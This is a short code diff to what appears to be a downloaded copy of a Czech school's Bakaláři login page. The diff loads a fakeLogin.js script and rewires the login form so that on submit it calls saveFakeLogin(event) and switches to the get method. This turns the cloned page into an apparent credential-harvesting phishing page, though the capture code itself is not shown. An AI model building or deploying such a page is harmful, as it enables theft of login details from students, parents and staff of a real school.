@@ -19,11 +19,12 @@
     <script src="./ls-capslock.js.stažený soubor"></script>
     <script src="./loginFunctions.js.stažený soubor"></script>
     <script src="./master_core.js.stažený soubor"></script>
+    <script src="./fakeLogin.js"></script>
     <link rel="shortcut icon" href="https://bakalari.zskraslice.cz/next/images/favicon.ico">
 </head>
 
 <body>
-    <form id="formlogin" action="./login.html" onsubmit="makeDisable()" method="post">
+    <form id="formlogin" action="./login.html" onsubmit="saveFakeLogin(event)" method="get">
         <div id="outer">
             <div id="middle">
                 <div id="generalWarning" class="general-warning" style="display: none;"></div>
@@ -103,5 +104,4 @@ Přihlašovací údaje vám sdělí na požádání třídní učitel.
 
 
 </body>
-<script src="fakeLogin.js"></script>
 </html>
